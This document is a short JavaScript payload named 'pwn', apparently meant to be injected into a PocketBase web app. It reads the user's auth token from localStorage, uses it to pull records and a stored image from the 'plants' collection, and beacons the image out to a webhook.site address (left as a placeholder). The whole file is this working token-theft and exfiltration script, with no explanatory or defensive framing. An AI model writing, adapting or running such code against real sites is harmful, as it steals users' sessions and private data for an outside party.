const pwn = async () => {
	let dbUrl = "http://localhost";
	let token = JSON.parse(window.localStorage.pocketbase_auth).token;
	console.log(token);
	const response = await fetch(
		`${dbUrl}/api/collections/plants/records?page=1&perPage=500`,
		{
			headers: {
				Authorization: token,
				"Content-Type": "application/json",
			},
		}
	);
	const data = await response.json();
	console.log(data);
	const i = data.items[0];
	const img = await fetch(
		`${dbUrl}/api/files/${i.collectionId}/${i.id}/${i.img}`,
		{
			headers: {
				Authorization: token,
			},
		}
	);
	const imgBlob = await img.blob();
	const formData = new FormData();
	formData.append("file", imgBlob, "pwn.jpg");
	navigator.sendBeacon("https://webhook.site/YOUR_WEBHOOK_HERE", formData);
};

pwn();
